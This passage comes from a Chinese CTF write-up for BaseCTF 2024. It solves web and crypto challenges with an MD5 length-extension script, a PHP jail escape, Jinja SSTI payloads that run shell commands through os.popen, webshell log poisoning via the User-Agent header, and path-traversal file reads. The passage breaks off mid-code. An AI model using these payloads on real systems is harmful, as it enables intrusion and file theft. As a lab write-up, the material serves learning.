</span></span><span style=display:flex><span>    previous_text <span style=color:#f92672>=</span> md5<span style=color:#f92672>.</span>padding(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>*</span> message_len)
</span></span><span style=display:flex><span>    current_text <span style=color:#f92672>=</span> previous_text <span style=color:#f92672>+</span> append_str
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    md5<span style=color:#f92672>.</span>A, md5<span style=color:#f92672>.</span>B, md5<span style=color:#f92672>.</span>C, md5<span style=color:#f92672>.</span>D <span style=color:#f92672>=</span> unpack(<span style=color:#e6db74>&#34;&lt;IIII&#34;</span>, bytes<span style=color:#f92672>.</span>fromhex(known_hash))
</span></span><span style=display:flex><span>    md5<span style=color:#f92672>.</span>extend(md5<span style=color:#f92672>.</span>padding(current_text)[len(previous_text):])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> current_text[message_len:], md5<span style=color:#f92672>.</span>digest()<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    message_len <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;[&gt;] Input known text length: &#34;</span>))
</span></span><span style=display:flex><span>    known_hash <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;[&gt;] Input known hash: &#34;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>    append_text <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;[&gt;] Input append text: &#34;</span>)<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Attacking...&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    extend_str, final_hash <span style=color:#f92672>=</span> attack(message_len, known_hash, append_text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> quote
</span></span><span style=display:flex><span>    <span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Extend text:&#34;</span>, extend_str)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Extend text (URL encoded):&#34;</span>, quote(extend_str))
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Extend text (Base64):&#34;</span>, b64encode(extend_str)<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Final hash:&#34;</span>, final_hash)
</span></span></code></pre></div><p>通过对源码的分析得知random的长度应该是96</p><p><img alt=dongmd5 loading=lazy src=/posts/ctf/basectf2024/dongmd5.png></p><p>然后填入就好了</p><p><img alt=dongmd51 loading=lazy src=/posts/ctf/basectf2024/dongmd51.png></p><h1 id=week3>week3</h1><h2 id=web-2>web</h2><h3 id=ez_php_jail>ez_php_jail</h3><p>这题搜一下其实挺有意思的，应该是从这篇文章进行微调出的题目,<a href=https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/>ringzer0 CTF - Jail Escaping PHP</a>,具体应该是对应level4的那个题目</p><p>打开查看源码进行base64解密，进入可以查看phpinfo(),得到了php版本是7.4,以及一些disable_functions</p><p>直接利用文章构造payload,其外根据php特性，在php小于8的情况下<code>_</code>是直接转化成<code>.</code>可以利用<code>[</code>进行绕过</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?Jail<span style=color:#f92672>[</span>by.Happy<span style=color:#f92672>=</span>highlight_file<span style=color:#f92672>(</span>glob<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/f*&#34;</span><span style=color:#f92672>)[</span>0<span style=color:#f92672>])</span>;
</span></span></code></pre></div><h3 id=复读机>复读机</h3><p>有过滤的，手测一下</p><p><code>{{</code> <code>+</code> <code>-</code> <code>*</code> <code>}}</code> <code>"</code> <code>:</code> <code>\</code> <code>/</code> <code>__</code> <code>.</code>,接下来就是正常的RCE就行了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BaseCTF{<span style=color:#f92672>%</span>print(<span style=color:#e6db74>&#39;&#39;</span>[<span style=color:#e6db74>&#39;_&#39;&#39;_cla&#39;&#39;ss_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_m&#39;&#39;ro_&#39;&#39;_&#39;</span>][<span style=color:#ae81ff>1</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_subcl&#39;&#39;asses_&#39;&#39;_&#39;</span>]()[<span style=color:#ae81ff>137</span>])<span style=color:#f92672>%</span>}
</span></span></code></pre></div><p>可以利用<code>BaseCTF&lt;class 'os._wrap_close'></code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BaseCTF{<span style=color:#f92672>%</span>print(<span style=color:#e6db74>&#39;&#39;</span>[<span style=color:#e6db74>&#39;_&#39;&#39;_cla&#39;&#39;ss_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_m&#39;&#39;ro_&#39;&#39;_&#39;</span>][<span style=color:#ae81ff>1</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_subcl&#39;&#39;asses_&#39;&#39;_&#39;</span>]()[<span style=color:#ae81ff>137</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_gl&#39;&#39;obals_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;po&#39;&#39;pen&#39;</span>](<span style=color:#e6db74>&#39;env&#39;</span>)[<span style=color:#e6db74>&#39;re&#39;&#39;ad&#39;</span>]())<span style=color:#f92672>%</span>}
</span></span></code></pre></div><p>看看环境，已知不能使用<code>/</code>,可以切换根目录再读取</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BaseCTF{<span style=color:#f92672>%</span>print(<span style=color:#e6db74>&#39;&#39;</span>[<span style=color:#e6db74>&#39;_&#39;&#39;_cla&#39;&#39;ss_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_m&#39;&#39;ro_&#39;&#39;_&#39;</span>][<span style=color:#ae81ff>1</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_subcl&#39;&#39;asses_&#39;&#39;_&#39;</span>]()[<span style=color:#ae81ff>137</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;_&#39;&#39;_gl&#39;&#39;obals_&#39;&#39;_&#39;</span>][<span style=color:#e6db74>&#39;po&#39;&#39;pen&#39;</span>](<span style=color:#e6db74>&#39;cd $OLDPWD;cat flag&#39;</span>)[<span style=color:#e6db74>&#39;re&#39;&#39;ad&#39;</span>]())<span style=color:#f92672>%</span>}
</span></span></code></pre></div><h3 id=滤个不停>滤个不停</h3><p>这题和ctfshow的web4基本差不多，一开始我以为要从伪协议入手，还是要求的是服务器日志，用的是Nginx，存放在/var/log/nginx/access.log里面，让Datch赋值这个，然后在UA头里写马就行了</p><p><img alt=滤个不停 loading=lazy src=/posts/ctf/basectf2024/%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C.png></p><h3 id=玩原神玩的>玩原神玩的</h3><p>这题其实还是能研究很多的，我写代码的能力一直挺一般的，这个还是稍微考究一些</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>sizeof</span>($_POST[<span style=color:#e6db74>&#39;len&#39;</span>]) <span style=color:#f92672>==</span> <span style=color:#a6e22e>sizeof</span>($array)) {
</span></span><span style=display:flex><span> <span style=color:#a6e22e>ys_open</span>($_GET[<span style=color:#e6db74>&#39;tip&#39;</span>]);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;错了！就你还想玩原神？❌❌❌&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ys_open</span>($tip) {
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> ($tip <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;我要玩原神&#34;</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;我不管，我要玩原神！😭😭😭&#34;</span>);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#a6e22e>dumpFlag</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dumpFlag</span>() {
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;m&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#a6e22e>sizeof</span>($_POST[<span style=color:#e6db74>&#39;m&#39;</span>]) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;可恶的QQ人！😡😡😡&#34;</span>);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> $a <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;m&#39;</span>][<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span> $b <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;m&#39;</span>][<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>empty</span>($a) <span style=color:#f92672>||</span> <span style=color:#66d9ef>empty</span>($b) <span style=color:#f92672>||</span> $a <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;100%&#34;</span> <span style=color:#f92672>||</span> $b <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;love100%&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>md5</span>($a)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;某站崩了？肯定是某忽悠干的！😡😡😡&#34;</span>);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span> $flag[] <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span> <span style=color:#66d9ef>for</span> ($ii <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;$ii <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>sizeof</span>($array);$ii<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>  $flag[$ii] <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>ord</span>($array[$ii]) <span style=color:#f92672>^</span> $ii);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>json_encode</span>($flag);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>先看第一层写脚本爆</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.basectf.fun:23955/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> {<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;len[</span><span style=color:#e6db74>{</span>j<span style=color:#e6db74>}</span><span style=color:#e6db74>]&#39;</span>: <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(i)}
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>    print(response<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>splitlines()[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>    last_line <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>splitlines()[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;我不管，我要玩原神！😭😭😭&#34;</span> <span style=color:#f92672>in</span> last_line:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Success with </span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74> parameters!&#39;</span>)
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>=</span> i
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ans:
</span></span><span style=display:flex><span>    payload_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&amp;&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;len[</span><span style=color:#e6db74>{</span>j<span style=color:#e6db74>}</span><span style=color:#e6db74>]=0&#39;</span> <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(ans)])
</span></span><span style=display:flex><span>    print(payload_str)
</span></span></code></pre></div><p>第二层输入<code>?tip=我要玩原神</code></p><p>第三层直接输入需要url编码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>m<span style=color:#f92672>[</span>0<span style=color:#f92672>]=</span>100%25&amp;m<span style=color:#f92672>[</span>1<span style=color:#f92672>]=</span>love100%2530bd7ce7de206924302499f197c7a966
</span></span></code></pre></div><p>最后一层</p><ol><li><strong>已知每个加密字符串 <code>enc[i]</code> 是由字符的 ASCII 值和索引 <code>i</code> 异或后的结果再进行 <code>md5</code> 哈希得到的</strong>。</li><li><strong>通过暴力破解的方法</strong>：<ul><li>对每个加密的哈希值 <code>enc[i]</code>，尝试所有可能的字符（ASCII值从0到126）。</li><li>计算这些字符与其索引 <code>i</code> 异或后的值，并对该值进行 <code>md5</code> 哈希。</li><li>如果哈希结果与 <code>enc[i]</code> 相同，说明找到了正确的字符。</li></ul></li><li><strong>最终结果是解密后的字符串 <code>flag</code></strong>。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;3295c76acbf4caaed33c36b1b5fc2cb1&#34;</span>, <span style=color:#e6db74>&#34;26657d5ff9020d2abefe558796b99584&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;73278a4a86960eeb576a8fd4c9ec6997&#34;</span>, <span style=color:#e6db74>&#34;ec8956637a99787bd197eacd77acce5e&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;e2c420d928d4bf8ce0ff2ec19b371514&#34;</span>, <span style=color:#e6db74>&#34;43ec517d68b6edd3015b3edc9a11367b&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ea5d2f1c4608232e07d3aa3d998e5135&#34;</span>, <span style=color:#e6db74>&#34;c8ffe9a587b126f152ed3d89a146b445&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;072b030ba126b2f4b2374f342be9ed44&#34;</span>, <span style=color:#e6db74>&#34;f457c545a9ded88f18ecee47145a72c0&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;698d51a19d8a121ce581499d7b701668&#34;</span>, <span style=color:#e6db74>&#34;c0c7c76d30bd3dcaefc96f40275bdc0a&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;9a1158154dfa42caddbd0694a4e9bdc8&#34;</span>, <span style=color:#e6db74>&#34;a3c65c2974270fd093ee8a9bf8ae7d0b&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;b53b3a3d6ab90ce0268229151c9bde11&#34;</span>, <span style=color:#e6db74>&#34;072b030ba126b2f4b2374f342be9ed44&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;7f39f8317fbdb1988ef4c628eba02591&#34;</span>, <span style=color:#e6db74>&#34;d67d8ab4f4c10bf22aa353e27879133c&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;5ef059938ba799aaa845e1c2e8a762bd&#34;</span>, <span style=color:#e6db74>&#34;1c383cd30b7c298ab50293adfecb7b18&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;a5771bce93e200c36f7cd9dfd0e5deaa&#34;</span>, <span style=color:#e6db74>&#34;9f61408e3afb633e50cdf1b20de6f466&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;e369853df766fa44e1ed0ff613f563bd&#34;</span>, <span style=color:#e6db74>&#34;e369853df766fa44e1ed0ff613f563bd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;6c8349cc7260ae62e3b1396831a8398f&#34;</span>, <span style=color:#e6db74>&#34;a0a080f42e6f13b3a2df133f073095dd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;b53b3a3d6ab90ce0268229151c9bde11&#34;</span>, <span style=color:#e6db74>&#34;a0a080f42e6f13b3a2df133f073095dd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;6c8349cc7260ae62e3b1396831a8398f&#34;</span>, <span style=color:#e6db74>&#34;069059b7ef840f0c74a814ec9237b6ec&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;f7177163c833dff4b38fc8d2872f1ec6&#34;</span>, <span style=color:#e6db74>&#34;c0c7c76d30bd3dcaefc96f40275bdc0a&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;c74d97b01eae257e44aa9d5bade97baf&#34;</span>, <span style=color:#e6db74>&#34;37693cfc748049e45d87b8c7d8b9aacd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;37693cfc748049e45d87b8c7d8b9aacd&#34;</span>, <span style=color:#e6db74>&#34;02e74f10e0327ad868d138f2b4fdd6f0&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;e2c420d928d4bf8ce0ff2ec19b371514&#34;</span>, <span style=color:#e6db74>&#34;7cbbc409ec990f19c78c75bd1e06f215&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ea5d2f1c4608232e07d3aa3d998e5135&#34;</span>, <span style=color:#e6db74>&#34;14bfa6bb14875e45bba028a21ed38046&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ad61ab143223efbc24c7d2583be69251&#34;</span>, <span style=color:#e6db74>&#34;6ea9ab1baa0efb9e19094440c317e21b&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;d1fe173d08e959397adf34b1d77e88d7&#34;</span>, <span style=color:#e6db74>&#34;d1fe173d08e959397adf34b1d77e88d7&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;43ec517d68b6edd3015b3edc9a11367b&#34;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>45</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>127</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(md5(str(c<span style=color:#f92672>^</span>i)<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()<span style=color:#f92672>==</span>enc[i]):
</span></span><span style=display:flex><span>            flag<span style=color:#f92672>+=</span>chr(c)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p>代码自行修改就可以得到flag了</p><h1 id=week4>week4</h1><h2 id=web-3>web</h2><h3 id=flag直接读取不就行了>flag直接读取不就行了？</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>$J1ng <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;J&#39;</span>];
</span></span><span style=display:flex><span>$Hong <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;H&#39;</span>];
</span></span><span style=display:flex><span>$Keng <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;K&#39;</span>];
</span></span><span style=display:flex><span>$Wang <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;W&#39;</span>];
</span></span><span style=display:flex><span>$dir <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> $Keng($Wang);
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($dir <span style=color:#66d9ef>as</span> $f) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>($f <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#66d9ef>new</span> $J1ng($Hong);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>读取目录可以利用<code>DirectoryIterator</code>进行读取，逐层遍历得到具体位置</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?K<span style=color:#f92672>=</span>DirectoryIterator&amp;W<span style=color:#f92672>=</span>../../../secret
</span></span></code></pre></div><p>然后post读取就可以得到flag了，需要看源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>J<span style=color:#f92672>=</span>SplFileObject&amp;H<span style=color:#f92672>=</span>../../../secret/f11444g.php
</span></span></code></pre></div><h3 id=圣钥之战10>圣钥之战1.0</h3><p>考察python原型链的知识，以前没写过刚好帮我入了门，先上源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask,request
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>merge</span>(src, dst):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> src<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> hasattr(dst, <span style=color:#e6db74>&#39;__getitem__&#39;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> dst<span style=color:#f92672>.</span>get(k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>                merge(v, dst<span style=color:#f92672>.</span>get(k))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                dst[k] <span style=color:#f92672>=</span> v
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> hasattr(dst, k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>            merge(v, getattr(dst, k))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            setattr(dst, k, v)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_json</span>(data):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        json<span style=color:#f92672>.</span>loads(data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>cls</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>instance <span style=color:#f92672>=</span> cls()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hello_world</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(<span style=color:#e6db74>&#39;/static/index.html&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/read&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Read</span>():
</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> open(__file__, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;J1ngHong说：你想read flag吗？</span>
</span></span><span style=display:flex><span>那么圣钥之光必将阻止你<span style=color:#960050;background-color:#1e0010>！</span>
</span></span><span style=display:flex><span>但是小小的源码没事<span style=color:#960050;background-color:#1e0010>，</span>因为你也读不到flag(乐)
</span></span><span style=display:flex><span>{file}
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span>
